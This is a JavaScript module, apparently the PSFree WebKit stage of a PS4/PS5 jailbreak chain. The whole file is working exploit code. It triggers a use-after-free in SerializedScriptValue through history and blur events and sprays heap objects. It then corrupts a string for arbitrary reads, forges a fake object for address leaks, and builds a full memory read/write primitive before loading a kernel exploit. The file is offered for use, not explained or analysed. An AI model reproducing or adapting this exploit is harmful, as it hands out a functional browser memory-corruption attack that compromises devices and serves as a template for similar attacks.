import { Int } from "/LapseHack/module/int64.mjs";
import { Memory } from "/LapseHack/module/mem.mjs";
import { KB, MB } from "/LapseHack/module/offset.mjs";
import { BufferView } from "/LapseHack/module/rw.mjs";
import { die, DieError, log, clear_log, sleep, hex, align } from "/LapseHack/module/utils.mjs";
import * as config from "/LapseHack/config.mjs";
import * as off from "/LapseHack/module/offset.mjs";

const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x600, 0x1000];
        } else {
            return [0x100, 0x600];
        }
    })();

    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }

    return [is_ps4, version];
})();
const ssv_len = (() => {
    if (!is_ps4) {
        return 0x50;
    }

    if (0x600 <= version && version < 0x650) {
        return 0x58;
    }
    if (0x650 <= version && version < 0x900) {
        return 0x48;
    }
    if (0x900 <= version) {
        return 0x50;
    }
    throw new RangeError(`unsupported: PS${is_ps4 ? "4" : "5"} | firmware ${hex(version)}`);
})();
const num_fsets = 0x180;
const num_spaces = 0x40;
const num_adjs = 8;
const num_reuses = 0x300;
const num_strs = 0x200;
const num_leaks = 0x100;
const rows = ",".repeat(ssv_len / 8 - 2);
const original_strlen = ssv_len - off.size_strimpl;
const original_loc = location.pathname;
function gc() {
    new Uint8Array(4 * MB);
}
function sread64(str, offset) {
    const low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
    const high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
    return new Int(low, high);
}
function prepare_uaf() {
    const fsets = [];
    const indices = [];

    function alloc_fs(fsets, size) {
        for (let i = 0; i < size / 2; i++) {
            const fset = document.createElement("frameset");
            fset.rows = rows;
            fset.cols = rows;
            fsets.push(fset);
        }
    }

    history.replaceState("state0", "");

    alloc_fs(fsets, num_fsets);

    history.pushState("state1", "", `${original_loc}#bar`);
    indices.push(fsets.length);

    alloc_fs(fsets, num_spaces);

    history.pushState("state1", "", `${original_loc}#foo`);
    indices.push(fsets.length);

    alloc_fs(fsets, num_spaces);

    history.pushState("state2", "");
    return [fsets, indices];
}
async function uaf_ssv(fsets, index, index2) {
    const views = [];
    const input = document.createElement("input");
    input.id = "input";
    const foo = document.createElement("input");
    foo.id = "foo";
    const bar = document.createElement("a");
    bar.id = "bar";
    let pop = null;
    let pop2 = null;
    let pop_promise2 = null;
    let blurs = [0, 0];
    let resolves = [];

    function onpopstate(event) {
        const no_pop = pop === null;
        const idx = no_pop ? 0 : 1;
        if (blurs[idx] === 0) {
            const r = resolves[idx][1];
            r(new DieError(`blurs before pop ${idx} came: ${blurs[idx]}`));
        }

        if (no_pop) {
            pop_promise2 = new Promise((resolve, reject) => {
                resolves.push([resolve, reject]);
                addEventListener("popstate", onpopstate, { once: true });
                history.back();
            });
        }

        if (no_pop) {
            pop = event;
        } else {
            pop2 = event;
        }
        resolves[idx][0]();
    }

    const pop_promise = new Promise((resolve, reject) => {
        resolves.push([resolve, reject]);
        addEventListener("popstate", onpopstate, { once: true });
    });

    function onblur(event) {
        const target = event.target;
        const is_input = target === input;
        const idx = is_input ? 0 : 1;
        if (blurs[idx] > 0) {
            die(`${name}: multiple blurs. blurs: ${blurs[idx]}`);
        }
        history.replaceState("state3", "", original_loc);
        const fset_idx = is_input ? index : index2;
        for (let i = fset_idx - num_adjs / 2; i < fset_idx + num_adjs / 2; i++) {
            fsets[i].rows = "";
            fsets[i].cols = "";
        }

        for (let i = 0; i < num_reuses; i++) {
            const view = new Uint8Array(new ArrayBuffer(ssv_len));
            view[0] = 0x41;
            views.push(view);
        }

        blurs[idx]++;
    }

    input.addEventListener("blur", onblur);
    foo.addEventListener("blur", onblur);
    document.body.append(input);
    document.body.append(foo);
    document.body.append(bar);

    if (document.readyState !== "complete") {
        await new Promise((resolve) => {
            document.addEventListener("readystatechange", function foo() {
                if (document.readyState === "complete") {
                    document.removeEventListener("readystatechange", foo);
                    resolve();
                }
            });
        });
    }

    await new Promise((resolve) => {
        input.addEventListener("focus", resolve, { once: true });
        input.focus();
    });

    history.back();
    await pop_promise;
    await pop_promise2;
    input.remove();
    foo.remove();
    bar.remove();

    const res = [];
    for (let i = 0; i < views.length; i++) {
        const view = views[i];
        if (view[0] !== 0x41) {
            view[0] = 1;
            view.fill(0, 1);

            if (res.length) {
                res[1] = [new BufferView(view.buffer), pop2];
                break;
            }
            res[0] = new BufferView(view.buffer);
            i = num_reuses - 1;
        }
    }

    if (res.length !== 2) {
        die("failed SerializedScriptValue UAF");
    }
    return res;
}
class Reader {
    constructor(rstr, rstr_view) {
        this.rstr = rstr;
        this.rstr_view = rstr_view;
        this.m_data = rstr_view.read64(off.strimpl_m_data);
    }

    read8_at(offset) {
        return this.rstr.charCodeAt(offset);
    }

    read32_at(offset) {
        const str = this.rstr;
        return (str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24)) >>> 0;
    }

    read64_at(offset) {
        return sread64(this.rstr, offset);
    }

    read64(addr) {
        this.rstr_view.write64(off.strimpl_m_data, addr);
        return sread64(this.rstr, 0);
    }

    set_addr(addr) {
        this.rstr_view.write64(off.strimpl_m_data, addr);
    }

    restore() {
        this.rstr_view.write64(off.strimpl_m_data, this.m_data);
        this.rstr_view.write32(off.strimpl_strlen, original_strlen);
    }
}
async function make_rdr(view) {
    let str_wait = 0;
    const strs = [];
    const u32 = new Uint32Array(1);
    const u8 = new Uint8Array(u32.buffer);
    const marker_offset = original_strlen - 4;
    const pad = "B".repeat(marker_offset);
    while (true) {
        for (let i = 0; i < num_strs; i++) {
            u32[0] = i;
            const str = [pad, String.fromCodePoint(...u8)].join("");
            strs.push(str);
        }

        if (view.read32(off.strimpl_inline_str) === 0x42424242) {
            view.write32(off.strimpl_strlen, 0xffffffff);
            break;
        }

        strs.length = 0;
        gc();
        await sleep();
        str_wait++;
    }

    const idx = view.read32(off.strimpl_inline_str + marker_offset);
    const rstr = Error(strs[idx]).message;
    if (rstr.length === 0xffffffff) {
        const addr = view.read64(off.strimpl_m_data).sub(off.strimpl_inline_str);
        return new Reader(rstr, view);
    }
    die("JSString wasn't modified");
}
const cons_len = ssv_len - 8 * 5;
const bt_offset = 0;
const idx_offset = ssv_len - 8 * 3;
const strs_offset = ssv_len - 8 * 2;
const src_part = (() => {
    let res = "var f = 0x11223344;\n";
    for (let i = 0; i < cons_len; i += 8) {
        res += `var a${i} = ${num_leaks + i};\n`;
    }
    return res;
})();
async function leak_code_block(reader, bt_size) {
    const rdr = reader;
    const bt = [];
    for (let i = 0; i < bt_size - 0x10; i += 8) {
        bt.push(i);
    }

    const slen = ssv_len;
    const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
    const part = bt_part + src_part;
    const cache = [];
    for (let i = 0; i < num_leaks; i++) {
        cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
    }

    const chunkSize = is_ps4 && version < 0x900 ? 128 * KB : 1 * MB;
    const smallPageSize = 4 * KB;
    const search_addr = align(rdr.m_data, chunkSize);
    let winning_off = null;
    let winning_idx = null;
    let winning_f = null;
    let find_cb_loop = 0;
    let fp = 0;
    rdr.set_addr(search_addr);
    loop: while (true) {
        const funcs = [];
        for (let i = 0; i < num_leaks; i++) {
            const f = Function(cache[i]);
            f();
            funcs.push(f);
        }

        for (let p = 0; p < chunkSize; p += smallPageSize) {
            for (let i = p; i < p + smallPageSize; i += slen) {
                if (rdr.read32_at(i + 8) !== 0x11223344) {
                    continue;
                }

                rdr.set_addr(rdr.read64_at(i + strs_offset));
                const m_type = rdr.read8_at(5);
                if (m_type !== 0) {
                    rdr.set_addr(search_addr);
                    winning_off = i;
                    winning_idx = rdr.read32_at(i + idx_offset);
                    winning_f = funcs[winning_idx];
                    break loop;
                }
                rdr.set_addr(search_addr);
                fp++;
            }
        }

        find_cb_loop++;
        gc();
        await sleep();
    }
    rdr.set_addr(search_addr.add(winning_off));
    const bt_addr = rdr.read64_at(bt_offset);
    const strs_addr = rdr.read64_at(strs_offset);
    rdr.set_addr(bt_addr);
    rdr.set_addr(strs_addr);
    return [winning_f, bt_addr, strs_addr];
}
function make_ssv_data(ssv_buf, view, view_p, addr, size) {
    const size_abc = (() => {
        if (is_ps4) {
            return version >= 0x900 ? 0x18 : 0x20;
        } else {
            return version >= 0x300 ? 0x18 : 0x20;
        }
    })();

    const data_len = 9;
    const size_vector = 0x10;
    const off_m_data = 8;
    const off_m_abc = 0x18;
    const voff_vec_abc = 0;
    const voff_abc = voff_vec_abc + size_vector;
    const voff_data = voff_abc + size_abc;
    ssv_buf.write64(off_m_data, view_p.add(voff_data));
    ssv_buf.write32(off_m_data + 8, data_len);
    ssv_buf.write64(off_m_data + 0xc, data_len);
    const CurrentVersion = 6;
    const ArrayBufferTransferTag = 23;
    view.write32(voff_data, CurrentVersion);
    view[voff_data + 4] = ArrayBufferTransferTag;
    view.write32(voff_data + 5, 0);
    ssv_buf.write64(off_m_abc, view_p.add(voff_vec_abc));
    view.write64(voff_vec_abc, view_p.add(voff_abc));
    view.write32(voff_vec_abc + 8, 1);
    view.write32(voff_vec_abc + 0xc, 1);

    if (size_abc === 0x20) {
        view.write64(voff_abc + 0x10, addr);
        view.write32(voff_abc + 0x18, size);
    } else {
        view.write64(voff_abc + 0, addr);
        view.write32(voff_abc + 0x14, size);
    }
}
async function make_arw(reader, view2, pop) {
    const rdr = reader;
    const fakeobj_off = 0x20;
    const fakebt_base = fakeobj_off + off.size_jsobj;
    const indexingHeader_size = 8;
    const arrayStorage_size = 0x18;
    const propertyStorage = 8;
    const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;
    const bt_size = 0x10 + fakebt_off + arrayStorage_size;
    const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);
    const view = rdr.rstr_view;
    const view_p = rdr.m_data.sub(off.strimpl_inline_str);
    const view_save = new Uint8Array(view);
    view.fill(0);
    make_ssv_data(view2, view, view_p, bt_addr, bt_size);
    const bt = new BufferView(pop.state);
    view.set(view_save);
    const val_true = 7;
    const strs_cell = rdr.read64(strs_addr);
    bt.write64(fakeobj_off, strs_cell);
    bt.write64(fakeobj_off + off.js_butterfly, bt_addr.add(fakebt_off));
    bt.write64(fakebt_off - 0x10, val_true);
    bt.write32(fakebt_off - 8, 1);
    bt.write32(fakebt_off - 8 + 4, 1);
    bt.write64(fakebt_off, 0);
    bt.write32(fakebt_off + 8, 0);
    bt.write32(fakebt_off + 0xc, 1);
    bt.write64(fakebt_off + 0x10, val_true);
    bt.write64(0x10, bt_addr.add(fakeobj_off));

    const fake = func()[0];
    const test_val = 3;
    fake[0] = test_val;
    if (fake[0] !== test_val) {
        die(`unexpected fake[0]: ${fake[0]}`);
    }
    function addrof(obj) {
        fake[0] = obj;
        return bt.read64(fakebt_off + 0x10);
    }
    const worker = new DataView(new ArrayBuffer(1));
    const main_template = new Uint32Array(new ArrayBuffer(off.size_view));
    const leaker = { addr: null, 0: 0 };
    const worker_p = addrof(worker);
    const main_p = addrof(main_template);
    const leaker_p = addrof(leaker);
    const scaled_sview = off.size_view / 4;
    const faker = new Uint32Array(scaled_sview);
    const faker_p = addrof(faker);
    const faker_vector = rdr.read64(faker_p.add(off.view_m_vector));
    const vector_idx = off.view_m_vector / 4;
    const length_idx = off.view_m_length / 4;
    const mode_idx = off.view_m_mode / 4;
    const bt_idx = off.js_butterfly / 4;
    faker[vector_idx] = worker_p.lo;
    faker[vector_idx + 1] = worker_p.hi;
    faker[length_idx] = scaled_sview;
    rdr.set_addr(main_p);
    faker[mode_idx] = rdr.read32_at(off.view_m_mode);
    faker[0] = rdr.read32_at(0);
    faker[1] = rdr.read32_at(4);
    faker[bt_idx] = rdr.read32_at(off.js_butterfly);
    faker[bt_idx + 1] = rdr.read32_at(off.js_butterfly + 4);
    bt.write64(fakebt_off + 0x10, faker_vector);
    const main = fake[0];
    for (let i = 0; i < off.size_view; i += 8) {
        const idx = i / 4;
    }
    new Memory(main, worker, leaker, leaker_p.add(off.js_inline_prop), rdr.read64(leaker_p.add(off.js_butterfly)));
    rdr.restore();
    view.write32(0, -1);
    view2.write32(0, -1);
    make_arw._buffer = bt.buffer;
}
async function main() {
	await forceGC();
    const [fsets, indices] = prepare_uaf();
    const [view, [view2, pop]] = await uaf_ssv(fsets, indices[1], indices[0]);
    const rdr = await make_rdr(view);
    for (const fset of fsets) {
        fset.rows = "";
        fset.cols = "";
    }
    await make_arw(rdr, view2, pop);
    clear_log();
    showMessage("PSfree finished, attempting kenel exploit");
    import("/LapseHack/lapse.mjs");
}
main();
